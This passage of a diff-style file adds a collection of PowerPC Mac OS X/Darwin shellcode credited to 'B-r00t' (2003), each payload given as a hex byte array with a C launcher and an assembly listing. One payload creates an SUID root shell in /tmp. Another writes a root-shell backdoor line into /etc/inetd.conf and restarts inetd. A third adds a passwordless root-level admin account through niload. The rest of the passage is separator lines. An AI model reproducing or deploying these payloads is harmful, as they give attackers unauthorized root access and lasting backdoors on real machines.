+"\x38\xaa\xfe\x9c\x38\x0a\xfe\x94"
+"\x44\xff\xff\x02\x60\x60\x60\x60"
+"\x38\x0a\xfe\x96\x44\xff\xff\x02"
+"\x60\x60\x60\x60\x38\x0a\xfe\x91"
+"\x44\xff\xff\x02\x2f\x74\x6d\x70"
+"\x2f\x73\x75\x69\x64\x58\x23\x21"
+"\x2f\x62\x69\x6e\x2f\x73\x68\x0a"
+"\x73\x68";
+
+int main (void) 
+{
+        __asm__("b _shellcode");
+}
+
+/*
+; PPC OS X / Darwin Shellcode by B-r00t. 
+; open(); write(); close(); exit()
+; Creates an SUID '/tmp/suid' to execute '/bin/sh'.
+;
+.globl _main
+.text
+_main:
+        xor.    r5, r5, r5
+        bnel    _main                    
+        mflr    r31
+        addi    r8, r31, 268+92+9
+        addi    r8, r8, -268    
+        stbx    r5, r8, r5
+        addi    r3, r31, 268+92
+        addi    r3, r3, -268
+        li      r4, 513
+        li      r5, -1  
+        li      r10, 368
+        addi    r0, r10, -363
+        .long   0x44ffff02
+        .long   0x60606060
+        addi    r4, r31, 268+92+10
+        addi    r4, r4, -268
+        addi    r5, r10, -356
+        addi    r0, r10, -364
+        .long   0x44ffff02
+        .long   0x60606060
+        addi    r0, r10, -362
+        .long   0x44ffff02      
+        .long   0x60606060
+        addi    r0, r10, -367
+        .long   0x44ffff02
+path:   .asciz  "/tmp/suidX#!/bin/sh\nsh"
+
+*/
+
+
+
+
+
+////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+/*
+PPC OS X / Darwin Shellcode by B-r00t. 2003.
+open(); write(); close(); execve(); exit();
+See ASM below.
+222 Bytes!
+*/
+
+char shellcode[] =
+"\x7c\xa5\x2a\x79\x40\x82\xff\xfd\x7d\x48\x02\xa6\x3b\xea\x01\x70"
+"\x39\x60\x01\x70\x39\x1f\xff\x1b\x7c\xa8\x29\xae\x39\x1f\xff\x65"
+"\x7c\xa8\x29\xae\x38\x7f\xff\x0c\x38\x8b\xfe\x99\x38\xa0\xff\xff"
+"\x38\x0b\xfe\x95\x44\xff\xff\x02\x60\x60\x60\x60\x38\x9f\xff\x1c"
+"\x38\xab\xfe\xca\x38\x0b\xfe\x94\x44\xff\xff\x02\x60\x60\x60\x60"
+"\x38\x0b\xfe\x96\x44\xff\xff\x02\x60\x60\x60\x60\x7c\xa5\x2a\x79"
+"\x38\x7f\xff\x56\x90\x61\xff\xf8\x90\xa1\xff\xfc\x38\x81\xff\xf8"
+"\x38\x0b\xfe\xcb\x44\xff\xff\x02\x60\x60\x60\x60\x38\x0b\xfe\x91"
+"\x44\xff\xff\x02\x2f\x65\x74\x63\x2f\x69\x6e\x65\x74\x64\x2e\x63"
+"\x6f\x6e\x66\x58\x0a\x61\x63\x6d\x73\x6f\x64\x61\x20\x73\x74\x72"
+"\x65\x61\x6d\x20\x74\x63\x70\x20\x6e\x6f\x77\x61\x69\x74\x20\x72"
+"\x6f\x6f\x74\x20\x2f\x75\x73\x72\x2f\x6c\x69\x62\x65\x78\x65\x63"
+"\x2f\x74\x63\x70\x64\x20\x2f\x62\x69\x6e\x2f\x73\x68\x0a\x2f\x75"
+"\x73\x72\x2f\x73\x62\x69\x6e\x2f\x69\x6e\x65\x74\x64\x58";
+
+int main (void) 
+{
+        __asm__("b _shellcode");
+}
+
+/*
+; PPC OS X / Darwin Shellcode by B-r00t. 
+; open(); write(); close(); execve(); exit()
+; Appends a backdoor (port 6969 rootshell) line into 
+; '/etc/inetd.conf' and executes '/usr/sbin/inetd'.
+; Commands MUST end with ';' ie. uname -a;
+;
+.globl _main
+.text
+_main:
+        xor.    r5, r5, r5
+        bnel    _main                    
+        mflr    r10
+	addi	r31, r10, 368
+	li      r11, 368
+        addi    r8, r31, -229 
+        stbx    r5, r8, r5
+        addi    r8, r31, -155 
+        stbx    r5, r8, r5
+        addi    r3, r31, -244
+	addi    r4, r11, -359
+        li      r5, -1  
+        addi    r0, r11, -363 
+        .long   0x44ffff02
+        .long   0x60606060
+        addi    r4, r31, -228 
+        addi    r5, r11, -310
+        addi    r0, r11, -364
+        .long   0x44ffff02
+        .long   0x60606060
+        addi    r0, r11, -362
+        .long   0x44ffff02      
+        .long   0x60606060
+        xor.    r5, r5, r5
+        addi    r3, r31, -170          
+        stw     r3, -8(r1)      
+        stw     r5, -4(r1)      
+        subi    r4, r1, 8       
+        addi     r0, r11, -309             
+        .long   0x44ffff02      
+        .long   0x60606060
+        addi    r0, r11, -367
+        .long   0x44ffff02
+path:   .asciz  "/etc/inetd.confX\nacmsoda stream tcp nowait root /usr/libexec/tcpd /bin/sh\n/usr/sbin/inetdX"
+
+*/
+
+
+
+
+
+////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+/* 
+PPC OS X / Darwin Shellcode by B-r00t. 2003.
+open(); write(); close(); execve(); exit();
+See ASM below.
+219 Bytes!
+*/
+
+char shellcode[] =
+"\x7c\xa5\x2a\x79\x40\x82\xff\xfd\x7d\x48\x02\xa6\x3b\xea\x01\x70"
+"\x39\x60\x01\x70\x39\x1f\xff\x0d\x7c\xa8\x29\xae\x38\x7f\xff\x04"
+"\x38\x80\x02\x01\x38\xa0\xff\xff\x38\x0b\xfe\x95\x44\xff\xff\x02"
+"\x60\x60\x60\x60\x38\x9f\xff\x0e\x38\xab\xfe\xe5\x38\x0b\xfe\x94"
+"\x44\xff\xff\x02\x60\x60\x60\x60\x38\x0b\xfe\x96\x44\xff\xff\x02"
+"\x60\x60\x60\x60\x7c\xa5\x2a\x79\x38\x7f\xff\x04\x90\x61\xff\xf8"
+"\x90\xa1\xff\xfc\x38\x81\xff\xf8\x38\x0b\xfe\xcb\x44\xff\xff\x02"
+"\x60\x60\x60\x60\x38\x0b\xfe\x91\x44\xff\xff\x02\x2f\x74\x6d\x70"
+"\x2f\x78\x2e\x73\x68\x58\x23\x21\x2f\x62\x69\x6e\x2f\x73\x68\x0a"
+"\x2f\x62\x69\x6e\x2f\x65\x63\x68\x6f\x20\x27\x72\x30\x30\x74\x3a"
+"\x3a\x39\x39\x39\x3a\x38\x30\x3a\x3a\x30\x3a\x30\x3a\x72\x30\x30"
+"\x74\x3a\x2f\x3a\x2f\x62\x69\x6e\x2f\x73\x68\x27\x20\x7c\x20\x2f"
+"\x75\x73\x72\x2f\x62\x69\x6e\x2f\x6e\x69\x6c\x6f\x61\x64\x20\x2d"
+"\x6d\x20\x70\x61\x73\x73\x77\x64\x20\x2e\x0a";
+
+int main (void) 
+{
+        __asm__("b _shellcode");
+}
+
+
+/*
+; PPC OS X / Darwin Shellcode by B-r00t. 
+; open(); write(); close(); execve(); exit()
+; Adds a user account (admin member) using a 
+; '/tmp/x.sh shellscript (niload).
+; echo 'r00t::999:80::0:0:r00t:/:/bin/sh' | /usr/bin/niload -m passwd . 
+;
+.globl _main
+.text
+_main:
+        xor.    r5, r5, r5
+        bnel    _main                    
+        mflr    r10
+	addi	r31, r10, 368
+	li	r11, 368
+        addi    r8, r31, -243
+        stbx    r5, r8, r5
+        addi    r3, r31, -252
+        li      r4, 513
+        li      r5, -1  
+        addi    r0,  r11, -363
+        .long   0x44ffff02
+        .long   0x60606060
+        addi    r4, r31, -242
+        addi    r5, r11, -283
+        addi    r0, r11, -364
+        .long   0x44ffff02
+        .long   0x60606060
+        addi    r0, r11, -362
+        .long   0x44ffff02      
+        .long   0x60606060
+        xor.    r5, r5, r5
+        addi    r3, r31, -252          
+        stw     r3, -8(r1)      
+        stw     r5, -4(r1)      
+        subi    r4, r1, 8       
+        addi    r0, r11, -309             
+        .long   0x44ffff02      
+        .long   0x60606060
+        addi    r0, r11, -367
+        .long   0x44ffff02
+path:   .asciz  "/tmp/x.shX#!/bin/sh\n/bin/echo 'r00t::999:80::0:0:r00t:/:/bin/sh' | /usr/bin/niload -m passwd .\n"
+*/
+
+
+
+
+////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+
+
+
+
+
+////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+
+
+////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+
+
+////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+
+
+////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+
+
+////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+
+
+////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+
+
+////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+
+
+////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+
+
+////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+
+
+
+
+
+////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+
+
+////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+
+
+////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+
+
+////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+
+
+////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+
+
+////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+
+
+////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+
+
+////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+
+
+////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+
+
+
+
+
+////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+
+
+////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+
+
+////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+
+
+////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+
+
+////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+
+
+////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+
+
+////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+
+
+////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+
+
+////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+
+
